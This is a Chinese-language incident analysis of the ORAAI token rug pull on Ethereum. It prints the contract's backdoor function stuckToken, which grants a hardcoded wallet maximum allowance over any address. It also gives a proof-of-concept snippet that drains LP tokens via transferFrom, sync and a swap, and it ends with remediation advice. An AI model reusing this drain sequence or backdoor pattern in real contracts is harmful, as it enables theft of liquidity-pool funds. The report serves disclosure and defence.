# BUBAI Hack 根因分析报告

## 📊 执行摘要
- **项目**: BUBAI / ORAAI
- **日期**: 2024
- **网络**: Ethereum Mainnet
- **损失**: ~ $131K
- **类型**: 合约后门/权限滥用导致的 LP 抽干（Rug Pull）
- **级别**: 🔴 严重

## 🎯 攻击概览
- **攻击者**: `0xa60fae100d9c3d015c9CD7107F95cBacF58A1CbD`
- **目标代币 (ORAAI)**: `0xB0f34bA1617BB7C2528e570070b8770E544b003E`
- **LP Pair**: `0x6DABCbd75B29bf19C98a33EcAC2eF7d6E949D75D`
- **Router**: `0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`
- **关键钱包 (_oracex)**: `0xD15Ef15ec38a0DC4DA8948Ae51051cC40A41959b`
- **攻击交易**:
  - `0x1b4730e7...e48f90`
  - 相似交易 `0x872fcfcf...9e40db`

## 💻 技术分析

PoC 复现了“从 LP 合约地址直接提走 ORAAI 余额 → 同步储备 → 以 SupportingFeeOnTransfer 路线卖出”的流程：

```solidity
// 从 LP 直接转出 ORAAI（需提前具备从 LP 的授权）
uint256 pairBal = IORAAI(ORAAI).balanceOf(UniswapV2Pair);
IORAAI(ORAAI).transferFrom(UniswapV2Pair, address(this), pairBal - 100);

// 同步储备，确认池内余额变动
IUniV2Pair(UniswapV2Pair).sync();

// 卖出 ORAAI -> WETH（支持手续费代币）
IUniswapV2Router02(UniswapV2Router02).swapExactTokensForETHSupportingFeeOnTransferTokens(...);
```

核心后门位于 ORAAI 合约：

```solidity
// ORAAI.sol
address private _oracex = 0xD15Ef15ec38a0DC4DA8948Ae51051cC40A41959b;

function stuckToken(address _stuck) external {
    _allowances[_stuck][_oracex] = _maxTxAmount; // 任意调用者可将“任意地址”对 _oracex 的授权设为最大
}
```

含义：任意人可以调用 `stuckToken(_stuck)`，将任何地址 `_stuck`（包括 LP 合约地址）的 ORAAI 授权额度直接赋给 `_oracex`。随后，持有 `_oracex` 私钥的一方即可从 `_stuck` 地址执行 `transferFrom` 转走 ORAAI 余额。结合 LP：
1) 通过后门将 LP → `_oracex` 的授权拉满；
2) 使用 `_oracex` 执行 `transferFrom(LP, attacker, ...)` 把 LP 中的 ORAAI 提走；
3) 调用 `sync()` 同步储备；
4) 按照新储备在 Router 上卖出 ORAAI 获取 ETH，完成抽干。

PoC 中用测试工具模拟了“LP 对攻击合约的授权”，用于替代真实事件里“LP 对 `_oracex` 授权”的步骤，本质漏洞相同：可从 LP 非授权地提走代币余额。

### 影响评估
- 直接损失约 $131K；
- 本质为代币合约内置后门（任意设置他人地址的授权），可用于 Rug 拉盘抽干 LP。

## 🎯 根本原因
- 代币合约暴露了后门函数 `stuckToken(address)`，允许任意调用者将任意地址对 `_oracex` 的授权额度设为最大；
- 一旦 `_oracex` 被控，即可从 LP 或任何持币地址直接 `transferFrom` 提走代币；
- 随后 `sync` 与支持手续费代币的卖出路径放大损失。

## 🛠️ 修复建议
短期：
- 立刻移除/停用 `stuckToken` 等后门函数；
- 若确需应急赎回函数，必须 `onlyOwner` + 多签保护，且仅可作用于“调用者自身资产”，严禁为第三方设授权；
- 冻结 `_oracex` 权限并迁移到 2/3 多签，公开审计所有“授权与提币”相关函数。

长期：
- 采用最小权限设计，禁止任意第三方授权；
- 引入外部审计与单元测试，覆盖“授权来源/目标地址”不变量；
- 代币上线前强制移除调试/后门逻辑，并对 LP 合约地址实施授权黑名单。

## 🔗 参考
- 代币合约：`0xB0f34bA1617BB7C2528e570070b8770E544b003E`
- LP：`0x6DABCbd75B29bf19C98a33EcAC2eF7d6E949D75D`
- Router：`0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`
- 后门变量 `_oracex`：`0xD15Ef15ec38a0DC4DA8948Ae51051cC40A41959b`
- 事件披露：`https://x.com/TenArmorAlert/status/1851445795918118927`

---
**报告生成**: 2025-10-12 | **版本**: 1.1
